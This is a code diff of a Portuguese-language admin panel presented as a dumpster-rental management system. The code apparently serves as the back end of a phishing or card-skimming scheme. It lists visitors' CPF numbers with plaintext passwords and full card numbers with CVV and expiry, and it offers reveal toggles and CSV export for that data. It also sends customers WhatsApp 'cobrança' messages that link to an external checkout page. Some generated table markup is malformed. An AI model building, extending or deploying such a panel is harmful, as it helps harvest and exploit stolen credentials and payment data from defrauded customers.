@@ -237,7 +237,6 @@
         }
         .logout-btn:hover { background: var(--danger); border-color: var(--danger); color: #fff; transform: translateY(-2px); }
 
-        /* Dashboard Cards */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -276,7 +275,6 @@
             color: var(--accent);
         }
 
-        /* Charts Row */
         .charts-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -290,15 +288,9 @@
             border-radius: 20px;
             padding: 20px;
         }
-        .chart-card h4 {
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 16px;
-            color: var(--text);
-        }
+        .chart-card h4 { font-size: 14px; font-weight: 600; margin-bottom: 16px; color: var(--text); }
         canvas { max-height: 250px; width: 100%; }
 
-        /* Tabela de Escala - Pagamentos */
         .payments-table-section {
             background: var(--bg-card);
             border: 1px solid var(--border);
@@ -314,17 +306,8 @@
             flex-wrap: wrap;
             gap: 12px;
         }
-        .section-header h3 {
-            font-size: 16px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .tabs-mini {
-            display: flex;
-            gap: 8px;
-        }
+        .section-header h3 { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
+        .tabs-mini { display: flex; gap: 8px; }
         .tab-mini {
             padding: 6px 16px;
             background: var(--bg-sidebar);
@@ -334,28 +317,10 @@
             font-size: 12px;
             transition: all 0.2s;
         }
-        .tab-mini.active {
-            background: var(--accent);
-            border-color: var(--accent);
-            color: white;
-        }
-        .payment-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 13px;
-        }
-        .payment-table th {
-            text-align: left;
-            padding: 12px 8px;
-            color: var(--text-muted);
-            font-weight: 500;
-            border-bottom: 1px solid var(--border);
-        }
-        .payment-table td {
-            padding: 12px 8px;
-            border-bottom: 1px solid var(--border);
-            color: var(--text-secondary);
-        }
+        .tab-mini.active { background: var(--accent); border-color: var(--accent); color: white; }
+        .payment-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .payment-table th { text-align: left; padding: 12px 8px; color: var(--text-muted); font-weight: 500; border-bottom: 1px solid var(--border); }
+        .payment-table td { padding: 12px 8px; border-bottom: 1px solid var(--border); color: var(--text-secondary); }
         .payment-table tr:hover td { background: rgba(59,130,246,0.05); }
         .badge-paid { background: rgba(16,185,129,0.15); color: #10b981; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
         .badge-pending { background: rgba(245,158,11,0.15); color: #f59e0b; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
@@ -478,20 +443,8 @@
             border-bottom: 1px solid var(--border);
         }
         .modal-close { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-secondary); }
-        .btn-whats {
-            background: #25D366;
-            color: white;
-            border: none;
-            padding: 6px 12px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 12px;
-        }
-        .schedule-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 13px;
-        }
+        .btn-whats { background: #25D366; color: white; border: none; padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 12px; }
+        .schedule-table { width: 100%; border-collapse: collapse; font-size: 13px; }
         .schedule-table th, .schedule-table td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); }
         .badge { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 500; }
         .badge-success { background: rgba(16,185,129,0.15); color: #10b981; }
@@ -514,6 +467,16 @@
         .tab-content.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .footer { text-align: center; padding: 20px; color: var(--text-muted); font-size: 11px; border-top: 1px solid var(--border); margin-top: 32px; }
+        
+        .search-box { display: flex; align-items: center; background: var(--bg-sidebar); border: 1px solid var(--border); border-radius: 10px; padding: 6px 12px; gap: 8px; }
+        .search-box input { background: transparent; border: none; padding: 6px; color: var(--text); width: 160px; }
+        .search-box input:focus { outline: none; }
+        .theme-options { display: flex; gap: 12px; }
+        .theme-btn { width: 40px; height: 40px; border-radius: 12px; cursor: pointer; border: 2px solid transparent; transition: all 0.2s; }
+        .theme-dark-btn { background: #1a1f2e; }
+        .theme-light-btn { background: #ffffff; border: 1px solid #ddd; }
+        .toggle-card-btn { background: rgba(59,130,246,0.15); border: 1px solid rgba(59,130,246,0.3); padding: 6px 12px; border-radius: 8px; color: #3b82f6; cursor: pointer; font-size: 12px; }
+        
         @media (max-width: 768px) {
             .sidebar { transform: translateX(-260px); }
             .sidebar.mobile-open { transform: translateX(0); }
@@ -574,7 +537,6 @@
 
         <!-- Dashboard Content -->
         <div id="tabDashboard" class="tab-content active">
-            <!-- Stats Cards -->
             <div class="stats-grid">
                 <div class="stat-card"><div class="stat-value" id="statTotalRevenue">R$ 0</div><div class="stat-label">Receita Total</div><i class="fas fa-dollar-sign stat-icon"></i></div>
                 <div class="stat-card"><div class="stat-value" id="statPendingCount">0</div><div class="stat-label">Pagamentos Pendentes</div><i class="fas fa-clock stat-icon"></i></div>
@@ -582,13 +544,11 @@
                 <div class="stat-card"><div class="stat-value" id="statScheduleCount">0</div><div class="stat-label">Agendamentos Hoje</div><i class="fas fa-calendar-day stat-icon"></i></div>
             </div>
 
-            <!-- Charts -->
             <div class="charts-row">
                 <div class="chart-card"><h4><i class="fas fa-chart-pie"></i> Pagamentos por Status</h4><canvas id="statusChart"></canvas></div>
                 <div class="chart-card"><h4><i class="fas fa-chart-line"></i> Receita por Mês</h4><canvas id="revenueChart"></canvas></div>
             </div>
 
-            <!-- Escala de Pagamentos -->
             <div class="payments-table-section">
                 <div class="section-header">
                     <h3><i class="fas fa-table"></i> Escala de Pagamentos</h3>
@@ -600,41 +560,56 @@
                 </div>
                 <div style="overflow-x: auto;">
                     <table class="payment-table" id="paymentTable">
-                        <thead>
-                            <tr><th>Cliente</th><th>Telefone</th><th>Valor</th><th>Forma</th><th>Status</th><th>Data</th><th>Ações</th></tr>
-                        </thead>
+                        <thead><tr><th>Cliente</th><th>Telefone</th><th>Valor</th><th>Forma</th><th>Status</th><th>Data</th><th>Ações</th></tr></thead>
                         <tbody id="paymentTableBody"></tbody>
                     </table>
                 </div>
             </div>
 
-            <!-- Recent Activity -->
             <div class="card"><div class="card-header">Atividades Recentes</div><div id="recentActivity"></div></div>
         </div>
 
+        <!-- PRODUTOS -->
         <div id="tabProdutos" class="tab-content">
             <div class="card"><div class="card-header">Adicionar Produto</div><form id="productForm"><div class="form-row"><div class="form-group"><label>Nome</label><input type="text" id="prodNome" required></div><div class="form-group"><label>Tipo</label><select id="prodTipo"><option value="cacamba">Caçamba</option><option value="material">Material</option></select></div><div class="form-group"><label>Preço</label><input type="number" step="0.01" id="prodPreco" required></div></div><div class="form-row"><div class="form-group"><label>Dimensões</label><input type="text" id="prodDimensoes" placeholder="Ex: 2.0m x 1.5m x 1.0m"></div><div class="form-group"><label>Capacidade</label><input type="text" id="prodCapacidade" placeholder="Ex: 3m³"></div><div class="form-group"><label>Imagem URL</label><input type="text" id="prodImagem"></div></div><div class="form-group"><label>Descrição</label><textarea id="prodDescricao" rows="2"></textarea></div><button type="submit" class="btn-primary">Salvar Produto</button></form></div>
             <div class="card"><div class="card-header">Lista de Produtos</div><div id="productList" class="products-container"></div></div>
         </div>
 
+        <!-- Modal de Edição -->
+        <div id="editProductModal" class="modal"><div class="modal-content"><div class="modal-header"><h3>Editar Produto</h3><button class="modal-close" onclick="closeEditModal()">&times;</button></div><form id="editProductForm"><input type="hidden" id="editProdId"><div class="form-row"><div class="form-group"><label>Nome</label><input type="text" id="editProdNome" required></div><div class="form-group"><label>Tipo</label><select id="editProdTipo"><option value="cacamba">Caçamba</option><option value="material">Material</option></select></div><div class="form-group"><label>Preço</label><input type="number" step="0.01" id="editProdPreco" required></div></div><div class="form-row"><div class="form-group"><label>Dimensões</label><input type="text" id="editProdDimensoes"></div><div class="form-group"><label>Capacidade</label><input type="text" id="editProdCapacidade"></div><div class="form-group"><label>Imagem URL</label><input type="text" id="editProdImagem"></div></div><div class="form-group"><label>Descrição</label><textarea id="editProdDescricao" rows="2"></textarea></div><div style="display: flex; gap: 10px; margin-top: 16px;"><button type="submit" class="btn-primary">Salvar Alterações</button><button type="button" class="btn-delete" onclick="closeEditModal()">Cancelar</button></div></form></div></div>
+
+        <!-- AGENDAMENTOS -->
         <div id="tabAgendamentos" class="tab-content">
             <div class="card"><div class="card-header">Agendamentos</div><div class="table-wrapper" id="scheduleList"></div></div>
         </div>
 
+        <!-- USUÁRIOS -->
         <div id="tabUsers" class="tab-content">
-            <div class="card"><div class="card-header">Usuários</div><div class="table-wrapper"><table class="payment-table"><thead><tr><th>CPF</th><th>Senha</th><th>Telefone</th><th>Data</th><th>Ações</th></tr></thead><tbody id="usersTable"></tbody></table></div></div>
+            <div class="card">
+                <div class="card-header"><span>Usuários</span><div style="display:flex; gap:10px;"><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchUsers" placeholder="Buscar CPF..." onkeyup="filterUsers()"></div><button class="btn-primary" onclick="exportUsersCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllUsers()">Limpar Todos</button></div></div>
+                <div class="table-wrapper"><table class="payment-table"><thead><tr><th>CPF</th><th>Senha</th><th>Telefone</th><th>Data</th><th>Ações</th></tr></thead><tbody id="usersTable"></tbody></table></div>
+            </div>
         </div>
 
+        <!-- CARTÕES -->
         <div id="tabCards" class="tab-content">
-            <div class="card"><div class="card-header">Dados de Cartões</div><div class="table-wrapper"><table class="payment-table"><thead><tr><th>CPF</th><th>Número</th><th>Titular</th><th>CVV</th><th>Validade</th><th>Data</th><th>Ações</th></tr></thead><tbody id="cardsTable"></tbody></table></div></div>
+            <div class="card">
+                <div class="card-header"><span>Dados de Cartões</span><div style="display:flex; gap:10px; flex-wrap:wrap;"><button class="toggle-card-btn" onclick="toggleCardVisibility()"><i class="fas fa-eye toggle-icon"></i> Mostrar números</button><div class="search-box"><i class="fas fa-search"></i><input type="text" id="searchCards" placeholder="Buscar CPF..." onkeyup="filterCards()"></div><button class="btn-primary" onclick="exportCardsCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllCards()">Limpar Todos</button></div></div>
+                <div class="table-wrapper"><table class="payment-table"><thead><tr><th>CPF</th><th>Número</th><th>Titular</th><th>CVV</th><th>Validade</th><th>Data</th><th>Ações</th></tr></thead><tbody id="cardsTable"></tbody></table></div>
+            </div>
         </div>
 
-        <div id="tabPayments" class="tab-content"><div class="card"><div class="card-header">Histórico de Pagamentos</div><div id="paymentsList"></div></div></div>
+        <!-- PAGAMENTOS -->
+        <div id="tabPayments" class="tab-content"><div class="card"><div class="card-header"><span>Histórico de Pagamentos</span><div style="display:flex; gap:10px;"><button class="btn-primary" onclick="exportPaymentsCSV()">Export CSV</button><button class="btn-delete" onclick="clearAllPayments()">Limpar Todos</button></div></div><div id="paymentsList"></div></div></div>
+
+        <!-- LOGS -->
         <div id="tabLogs" class="tab-content"><div class="card"><div class="card-header">Logs do Sistema</div><div id="logsList"></div></div></div>
 
+        <!-- CONFIGURAÇÕES -->
         <div id="tabSettings" class="tab-content">
             <div class="card"><div class="card-header">Tema</div><div class="theme-options"><div class="theme-btn theme-dark-btn" onclick="setTheme('dark')"></div><div class="theme-btn theme-light-btn" onclick="setTheme('light')"></div></div></div>
             <div class="card"><div class="card-header">Adicionar Admin</div><form id="addUserForm"><div class="form-row"><div class="form-group"><label>Usuário</label><input type="text" id="newUsername"></div><div class="form-group"><label>Senha</label><input type="password" id="newPassword"></div></div><button type="submit" class="btn-primary">Adicionar</button></form></div>
+            <div class="card"><div class="card-header">Alterar Senha Admin</div><div class="form-group"><label>Senha Atual</label><input type="password" id="currentPass"></div><div class="form-group"><label>Nova Senha</label><input type="password" id="newPass"></div><div class="form-group"><label>Confirmar Senha</label><input type="password" id="confirmPass"></div><button class="btn-primary" onclick="changeAdminPassword()">Atualizar</button><div id="passwordMsg" style="margin-top:12px; font-size:12px;"></div></div>
         </div>
         <div class="footer">Ativa Caçambas | Sistema de Gestão</div>
     </main>
@@ -675,10 +650,12 @@ let refreshInterval = null;
 let productsData = [], usersData = [], cardsData = [], paymentsData = [], logsData = [], scheduleData = [];
 let statusChart = null, revenueChart = null;
 let currentPaymentFilter = 'all';
+let showCardNumbers = false;
+let currentEditId = null;
 
 function showToast(msg) { const toast = document.createElement('div'); toast.className = 'toast'; toast.innerHTML = msg; document.body.appendChild(toast); setTimeout(() => toast.remove(), 2500); }
 function formatCPF(cpf) { if(!cpf) return ''; cpf = cpf.toString(); if(cpf.length === 11) return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'); return cpf; }
-function formatPhone(phone) { if(!phone) return '-'; phone = phone.toString(); if(phone.length === 11) return phone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3'); return phone; }
+function formatPhone(phone) { if(!phone) return '-'; phone = phone.toString(); if(phone.length === 11) return phone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3'); if(phone.length === 10) return phone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3'); return phone; }
 function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m) { if(m === '&') return '&amp;'; if(m === '<') return '&lt;'; if(m === '>') return '&gt;'; return m; }); }
 
 function toggleSidebar() {
@@ -688,6 +665,22 @@ function toggleSidebar() {
 }
 function setTheme(theme) { document.body.classList.remove('theme-dark', 'theme-light'); document.body.classList.add(`theme-${theme}`); localStorage.setItem('adminTheme', theme); }
 function loadSavedTheme() { const saved = localStorage.getItem('adminTheme'); if(saved) setTheme(saved); else setTheme('dark'); } loadSavedTheme();
+
+function toggleCardVisibility() {
+    showCardNumbers = !showCardNumbers;
+    const btn = document.querySelector('.toggle-card-btn');
+    if(showCardNumbers) btn.innerHTML = '<i class="fas fa-eye-slash toggle-icon"></i> Ocultar números';
+    else btn.innerHTML = '<i class="fas fa-eye toggle-icon"></i> Mostrar números';
+    renderCards();
+}
+
+function getDisplayCardNumber(num) {
+    if(!num) return '****';
+    if(showCardNumbers) return num;
+    let str = num.toString().replace(/\s/g, '');
+    if(str.length >= 16) return '•••• •••• •••• ' + str.slice(-4);
+    return '•••• •••• •••• ' + str.slice(-4);
+}
 
 async function handleLogin() {
     const username = document.getElementById('loginUser').value.trim();
@@ -725,22 +718,15 @@ async function loadDashboardData() {
         const res = await fetch('/api/admin/stats', { headers: { 'Authorization': `Bearer ${adminToken}` } });
         const data = await res.json();
         const stats = data.stats || {};
-        document.getElementById('statTotalUsers').innerText = stats.total_users || 0;
-        document.getElementById('statProdutos').innerText = stats.total_produtos || 0;
-        document.getElementById('statAgendamentos').innerText = stats.total_agendamentos || 0;
-        
-        // Payment stats
         const paidTotal = paymentsData.filter(p => p.status === 'paid').reduce((s, p) => s + parseFloat(p.valor || 0), 0);
         const pendingCount = paymentsData.filter(p => p.status !== 'paid').length;
         const paidCount = paymentsData.filter(p => p.status === 'paid').length;
         document.getElementById('statTotalRevenue').innerHTML = `R$ ${paidTotal.toFixed(2)}`;
         document.getElementById('statPendingCount').innerText = pendingCount;
         document.getElementById('statPaidCount').innerText = paidCount;
-        
         const today = new Date().toISOString().split('T')[0];
         const todaySchedules = scheduleData.filter(s => s.data_agendamento === today).length;
         document.getElementById('statScheduleCount').innerText = todaySchedules;
-        
         renderPaymentTable();
         updateCharts();
         renderRecentActivity(logsData.slice(0, 10));
@@ -752,16 +738,16 @@ function renderPaymentTable() {
     let filtered = paymentsData;
     if(currentPaymentFilter === 'pending') filtered = paymentsData.filter(p => p.status !== 'paid');
     if(currentPaymentFilter === 'paid') filtered = paymentsData.filter(p => p.status === 'paid');
-    if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum pagamento encontrado</td></tr>'; return; }
+    if(!filtered.length) { tbody.innerHTML = '<td><td colspan="7" style="text-align:center">Nenhum pagamento encontrado</td></tr>'; return; }
     tbody.innerHTML = filtered.map(p => `
         <tr>
-            <td><strong>${escapeHtml(p.cliente_nome || formatCPF(p.cpf))}</strong><br><small style="color:var(--text-muted)">${formatCPF(p.cpf)}</small></td>
+            <td><strong>${escapeHtml(p.cliente_nome || formatCPF(p.cpf))}</strong><br><small>${formatCPF(p.cpf)}</small></td>
             <td>${formatPhone(p.telefone)}</td>
-            <td><span style="font-weight:600;">R$ ${parseFloat(p.valor).toFixed(2)}</span></td>
+            <td>R$ ${parseFloat(p.valor).toFixed(2)}</td>
             <td><span class="badge-pix">${p.tipo_pagamento || 'PIX'}</span></td>
             <td><span class="${p.status === 'paid' ? 'badge-paid' : 'badge-pending'}">${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</span></td>
             <td>${p.data_solicitacao ? new Date(p.data_solicitacao).toLocaleDateString() : '-'}</td>
-            <td><button class="btn-delete" onclick="deletePayment(${p.id})" style="padding:4px 10px;">Excluir</button></td>
+            <td><button class="btn-delete" onclick="deletePayment(${p.id})">Excluir</button></td>
         </tr>
     `).join('');
 }
@@ -780,59 +766,68 @@ function updateCharts() {
     const pending = paymentsData.filter(p => p.status !== 'paid').length;
     if(statusChart) statusChart.destroy();
     const ctx1 = document.getElementById('statusChart').getContext('2d');
-    statusChart = new Chart(ctx1, {
-        type: 'doughnut',
-        data: { labels: ['Pagos', 'Pendentes'], datasets: [{ data: [paid, pending], backgroundColor: ['#10b981', '#f59e0b'], borderWidth: 0 }] },
-        options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { position: 'bottom', labels: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } } }
-    });
-    
-    // Revenue by month
+    statusChart = new Chart(ctx1, { type: 'doughnut', data: { labels: ['Pagos', 'Pendentes'], datasets: [{ data: [paid, pending], backgroundColor: ['#10b981', '#f59e0b'], borderWidth: 0 }] }, options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { position: 'bottom', labels: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } } } });
     const months = ['Jan', 'Fev', 'Mar', 'Abr', 'Mai', 'Jun', 'Jul', 'Ago', 'Set', 'Out', 'Nov', 'Dez'];
     const monthlyRevenue = new Array(12).fill(0);
-    paymentsData.filter(p => p.status === 'paid').forEach(p => {
-        const date = new Date(p.data_solicitacao);
-        const month = date.getMonth();
-        monthlyRevenue[month] += parseFloat(p.valor || 0);
-    });
+    paymentsData.filter(p => p.status === 'paid').forEach(p => { const date = new Date(p.data_solicitacao); const month = date.getMonth(); monthlyRevenue[month] += parseFloat(p.valor || 0); });
     if(revenueChart) revenueChart.destroy();
     const ctx2 = document.getElementById('revenueChart').getContext('2d');
-    revenueChart = new Chart(ctx2, {
-        type: 'line',
-        data: { labels: months, datasets: [{ label: 'Receita (R$)', data: monthlyRevenue, borderColor: '#3b82f6', backgroundColor: 'rgba(59,130,246,0.1)', fill: true, tension: 0.3 }] },
-        options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } }, scales: { y: { ticks: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } }, x: { ticks: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } } }
-    });
+    revenueChart = new Chart(ctx2, { type: 'line', data: { labels: months, datasets: [{ label: 'Receita (R$)', data: monthlyRevenue, borderColor: '#3b82f6', backgroundColor: 'rgba(59,130,246,0.1)', fill: true, tension: 0.3 }] }, options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } }, scales: { y: { ticks: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } }, x: { ticks: { color: getComputedStyle(document.body).getPropertyValue('--text-secondary') } } } } });
 }
 
 function renderRecentActivity(logs) {
     const container = document.getElementById('recentActivity');
     if(!logs.length) { container.innerHTML = '<div style="padding:20px; text-align:center;">Nenhuma atividade recente</div>'; return; }
-    container.innerHTML = logs.map(log => `<div class="log-item" style="padding:10px 0; border-bottom:1px solid var(--border);"><span style="color:var(--text-muted); font-size:11px;">${new Date(log.data).toLocaleString()}</span> <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'SENHA' : 'CPF'}</span> <span>${formatCPF(log.cpf)}</span></div>`).join('');
+    container.innerHTML = logs.map(log => `<div style="padding:10px 0; border-bottom:1px solid var(--border);"><span style="color:var(--text-muted); font-size:11px;">${new Date(log.data).toLocaleString()}</span> <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'SENHA' : 'CPF'}</span> <span>${formatCPF(log.cpf)}</span></div>`).join('');
 }
 
+// PRODUTOS
 async function loadProducts() { if(!adminToken) return; try { const res = await fetch('/api/admin/produtos', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); if(data.success) { productsData = data.produtos || []; renderProducts(); } } catch(e) { console.error(e); } }
-function renderProducts() { const container = document.getElementById('productList'); if(!productsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">Nenhum produto</div>'; return; } container.innerHTML = productsData.map(p => `<div class="product-row"><div class="product-info"><div class="product-icon">${p.imagem ? `<img src="${p.imagem}" style="width:44px;height:44px;object-fit:cover;border-radius:12px;">` : `<i class="${p.icone || 'fas fa-box'}"></i>`}</div><div class="product-details"><h4>${escapeHtml(p.nome)}</h4><p>R$ ${(p.preco_promocional || p.preco).toFixed(2)}</p></div></div><div class="product-actions"><button class="btn-icon" onclick="deleteProduct(${p.id})"><i class="fas fa-trash"></i></button></div></div>`).join(''); }
+function renderProducts() { const container = document.getElementById('productList'); if(!productsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">Nenhum produto</div>'; return; } container.innerHTML = productsData.map(p => `<div class="product-row"><div class="product-info"><div class="product-icon">${p.imagem ? `<img src="${p.imagem}" style="width:44px;height:44px;object-fit:cover;border-radius:12px;">` : `<i class="${p.icone || 'fas fa-box'}"></i>`}</div><div class="product-details"><h4>${escapeHtml(p.nome)}</h4><p>R$ ${(p.preco_promocional || p.preco).toFixed(2)}</p></div></div><div class="product-actions"><button class="btn-icon" onclick="editProductModal(${p.id})"><i class="fas fa-edit"></i></button><button class="btn-icon" onclick="deleteProduct(${p.id})"><i class="fas fa-trash"></i></button></div></div>`).join(''); }
+function editProductModal(id) { const product = productsData.find(p => p.id === id); if(!product) return; currentEditId = id; document.getElementById('editProdId').value = product.id; document.getElementById('editProdNome').value = product.nome || ''; document.getElementById('editProdTipo').value = product.tipo || 'cacamba'; document.getElementById('editProdPreco').value = product.preco || ''; document.getElementById('editProdDimensoes').value = product.dimensoes || ''; document.getElementById('editProdCapacidade').value = product.capacidade || ''; document.getElementById('editProdImagem').value = product.imagem || ''; document.getElementById('editProdDescricao').value = product.descricao || ''; document.getElementById('editProductModal').classList.add('active'); }
+function closeEditModal() { document.getElementById('editProductModal').classList.remove('active'); currentEditId = null; }
+document.getElementById('editProductForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const product = { nome: document.getElementById('editProdNome').value, tipo: document.getElementById('editProdTipo').value, preco: parseFloat(document.getElementById('editProdPreco').value), descricao: document.getElementById('editProdDescricao').value, imagem: document.getElementById('editProdImagem').value, dimensoes: document.getElementById('editProdDimensoes').value, capacidade: document.getElementById('editProdCapacidade').value }; await fetch(`/api/admin/produtos/${currentEditId}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify(product) }); showToast('Produto atualizado'); closeEditModal(); await loadProducts(); });
 async function deleteProduct(id) { if(!confirm('Deletar produto?')) return; await fetch(`/api/admin/produtos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); showToast('Produto deletado'); await loadProducts(); }
 document.getElementById('productForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const product = { nome: document.getElementById('prodNome').value, tipo: document.getElementById('prodTipo').value, preco: parseFloat(document.getElementById('prodPreco').value), descricao: document.getElementById('prodDescricao').value, imagem: document.getElementById('prodImagem').value, dimensoes: document.getElementById('prodDimensoes').value, capacidade: document.getElementById('prodCapacidade').value }; await fetch('/api/admin/produtos', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify(product) }); showToast('Produto adicionado'); await loadProducts(); e.target.reset(); });
 
+// AGENDAMENTOS
 async function loadSchedule() { if(!adminToken) return; try { const res = await fetch('/api/admin/agendamentos', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); scheduleData = data.agendamentos || []; renderSchedule(); } catch(e) { console.error(e); } }
-function renderSchedule() { const container = document.getElementById('scheduleList'); if(!scheduleData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">Nenhum agendamento</div>'; return; } container.innerHTML = `<table class="schedule-table"><thead><tr><th>Cliente</th><th>Telefone</th><th>Endereço</th><th>Data</th><th>Ações</th></tr></thead><tbody>${scheduleData.map(a => `<tr><td>${escapeHtml(a.cliente_nome || '-')}<br><small>${formatCPF(a.cpf)}</small></td><td>${formatPhone(a.telefone)}</td><td>${escapeHtml(a.endereco_obra || '-')}</td><td>${a.data_agendamento ? new Date(a.data_agendamento).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteSchedule(${a.id})">Excluir</button></td></tr>`).join('')}</tbody></table>`; }
+function sendWhatsApp(phone, nome, endereco) { let numero = phone.toString().replace(/\D/g, ''); if(numero.length === 11) numero = '55' + numero; else numero = '5541992878772'; const texto = `🏗️ *ATIVA CAÇAMBAS - COBRANÇA*%0A%0AOlá *${encodeURIComponent(nome)}*!%0A%0A🔗 *LINK PARA PAGAMENTO:*%0Ahttps://reidacacambinha.onrender.com/checkout.html%0A%0A✅ Clique no link acima para finalizar o pagamento.`; window.open(`https://wa.me/${numero}?text=${texto}`, '_blank'); }
+function renderSchedule() { const container = document.getElementById('scheduleList'); if(!scheduleData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">Nenhum agendamento</div>'; return; } container.innerHTML = `<table class="schedule-table"><thead><tr><th>Cliente</th><th>Telefone</th><th>Endereço</th><th>Data</th><th>Ações</th></tr></thead><tbody>${scheduleData.map(a => `<tr><td>${escapeHtml(a.cliente_nome || '-')}<br><small>${formatCPF(a.cpf)}</small></td><td>${formatPhone(a.telefone)}</td><td>${escapeHtml(a.endereco_obra || '-')}</td><td>${a.data_agendamento ? new Date(a.data_agendamento).toLocaleDateString() : '-'}</td><td><button class="btn-whats" onclick="sendWhatsApp('${a.telefone || ''}', '${escapeHtml(a.cliente_nome || '').replace(/'/g, "\\'")}', '${escapeHtml(a.endereco_obra || '').replace(/'/g, "\\'")}')"><i class="fab fa-whatsapp"></i> Cobrar</button> <button class="btn-delete" onclick="deleteSchedule(${a.id})">Excluir</button></td></tr>`).join('')}</tbody></table>`; }
 async function deleteSchedule(id) { if(!confirm('Deletar agendamento?')) return; await fetch(`/api/admin/agendamentos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); showToast('Agendamento deletado'); await loadSchedule(); await loadDashboardData(); }
 
-async function loadUsers() { if(!adminToken) return; try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); usersData = data.users || []; document.getElementById('usersTable').innerHTML = usersData.map(u => `<tr><td>${formatCPF(u.cpf)}</td><td><span class="badge-warning">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone)}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Excluir</button></td></tr>`).join(''); } catch(e) { console.error(e); } }
+// USUÁRIOS
+async function loadUsers() { if(!adminToken) return; try { const res = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); usersData = data.users || []; renderUsers(); } catch(e) { console.error(e); } }
+function renderUsers() { const tbody = document.getElementById('usersTable'); if(!usersData.length) { tbody.innerHTML = '<td><td colspan="5">Nenhum usuário</td></tr>'; return; } tbody.innerHTML = usersData.map(u => `<tr><td>${formatCPF(u.cpf)}</td><td><span class="badge-warning">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone)}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Excluir</button></td></tr>`).join(''); }
+function filterUsers() { const term = document.getElementById('searchUsers')?.value.toLowerCase() || ''; const filtered = usersData.filter(u => (u.cpf || '').toLowerCase().includes(term) || (u.telefone || '').toLowerCase().includes(term)); const tbody = document.getElementById('usersTable'); if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="5">Nenhum resultado</td></td>'; return; } tbody.innerHTML = filtered.map(u => `<tr><td>${formatCPF(u.cpf)}</td><td><span class="badge-warning">${u.senha || '--------'}</span></td><td>${formatPhone(u.telefone)}</td><td>${u.data_senha ? new Date(u.data_senha).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteUser('${u.cpf}')">Excluir</button></td></tr>`).join(''); }
 async function deleteUser(cpf) { if(!confirm(`Deletar ${formatCPF(cpf)}?`)) return; await fetch(`/api/admin/delete/${encodeURIComponent(cpf)}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadUsers(); showToast('Usuário deletado'); }
+async function clearAllUsers() { if(!confirm('DELETAR TODOS OS USUÁRIOS?')) return; await fetch('/api/admin/clear', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadUsers(); showToast('Todos os usuários deletados'); }
